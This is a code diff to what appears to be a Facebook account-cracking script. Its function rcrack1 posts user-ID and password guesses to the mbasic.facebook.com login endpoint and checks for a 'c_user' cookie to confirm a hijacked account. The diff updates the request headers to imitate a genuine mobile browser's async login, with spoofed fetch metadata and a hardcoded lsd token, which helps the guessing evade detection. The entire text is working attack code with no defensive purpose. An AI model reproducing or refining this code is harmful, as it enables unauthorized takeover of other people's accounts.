@@ -257,21 +257,24 @@ def rcrack1(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {
-    'authority': 'm.facebook.com',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            header_freefb = {'authority': 'mbasic.facebook.com',
+    'method':'POST',
+    'path':'/login/device-based/login/async/?refsrc=deprecated&lwv=100',
+    'scheme':'https',
+    'accept': '*/*',
     'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
-    'cache-control': 'max-age=0',
-    'referer': 'https://www.google.com/',
+    'content-type': 'application/x-www-form-urlencoded',
+    'origin': 'https://mbasic.facebook.com',
+    'referer': 'https://mbasic.facebook.com/',
     'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
     'sec-ch-ua-mobile': '?1',
     'sec-ch-ua-platform': '"Android"',
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'cross-site',
-    'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'same-origin',
+    'x-asbd-id': '198387',
+    'x-fb-lsd': 'AVoPmsopEAk',
+    'user-agent': pro}
             lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
